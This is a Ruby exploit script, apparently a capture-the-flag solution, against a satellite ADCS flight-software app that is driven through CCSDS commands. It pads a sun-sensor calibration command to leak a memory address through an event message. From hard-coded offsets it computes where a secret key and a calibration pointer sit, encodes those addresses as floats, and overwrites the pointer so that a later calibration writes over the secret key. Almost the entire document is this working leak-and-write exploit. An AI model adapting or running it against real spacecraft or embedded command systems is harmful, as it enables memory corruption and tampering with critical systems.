# ADCS Challenge Solve

cal_ptr_delta_from_leak    = 0x07fc
#secret_key_delta_from_leak = 0x27d0
secret_key_delta_from_leak = 0x25c0

cal_msg  = "0, 0, 0"
cal_msg += " " * (64-cal_msg.length) 

cmd("ADCS HARDWARE_CMD with CCSDS_STREAMID 6623, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 3, CCSDS_FUNCCODE 4, CCSDS_CHECKSUM 0, HARDWARE_COMPONENT FSS, HARDWARE_COMMAND INIT")
sleep(1)
cmd("ADCS HARDWARE_CMD with CCSDS_STREAMID 6623, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 3, CCSDS_FUNCCODE 4, CCSDS_CHECKSUM 0, HARDWARE_COMPONENT FSS, HARDWARE_COMMAND START")

cmd("ADCS FSS_CALIBRATE with CCSDS_STREAMID 6623, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 66, CCSDS_FUNCCODE 13, CCSDS_CHECKSUM 0, CALIBRATION 0, CAL_X_Y_Z '#{cal_msg}'")
wait_check("CFE_EVS2 EVENT_MSG_PKT PKT_ID_EVENT_ID == 129", 5)

event_msg   = tlm("CFE_EVS2 EVENT_MSG_PKT MESSAGE")
leaked_addr = event_msg[-5..-1].unpack("<L")[0]

puts "Leaked Address: #{leaked_addr.to_s(16)}"

secret_key_addr = [leaked_addr - secret_key_delta_from_leak]
cal_ptr_addr    = [leaked_addr - cal_ptr_delta_from_leak]

puts "Secret_key_addr: #{secret_key_addr[0].to_s(16)}"
puts "cal_ptr_addr:    #{cal_ptr_addr[0].to_s(16)}"

secret_key_addr_f  = secret_key_addr.pack("L").unpack("f")[0]
cal_ptr_addr_f     = cal_ptr_addr.pack("L").unpack("f")[0]

puts "Secret_key_addr: #{secret_key_addr_f}"
puts "cal_ptr_addr: #{cal_ptr_addr_f}"

secret_key_addr_f = sprintf("%.12e", secret_key_addr_f)
cal_ptr_addr_f    = sprintf("%.12e", cal_ptr_addr_f)

overwrite_0 = "#{cal_ptr_addr_f}, #{cal_ptr_addr_f}, #{cal_ptr_addr_f}"
overwrite_1 = "#{secret_key_addr_f}, #{secret_key_addr_f}, #{secret_key_addr_f}"

puts overwrite_0
puts overwrite_1

cmd("ADCS FSS_CALIBRATE with CCSDS_STREAMID 6623, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 66, CCSDS_FUNCCODE 13, CCSDS_CHECKSUM 0, CALIBRATION 0, CAL_X_Y_Z '#{overwrite_0}'")
wait_check("CFE_EVS2 EVENT_MSG_PKT PKT_ID_EVENT_ID == 129", 5)

sleep(2)
# Overwrite the addresses we gave it
cmd("ADCS FSS_CALIBRATE with CCSDS_STREAMID 6623, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 66, CCSDS_FUNCCODE 13, CCSDS_CHECKSUM 0, CALIBRATION 1, CAL_X_Y_Z '#{overwrite_1}'")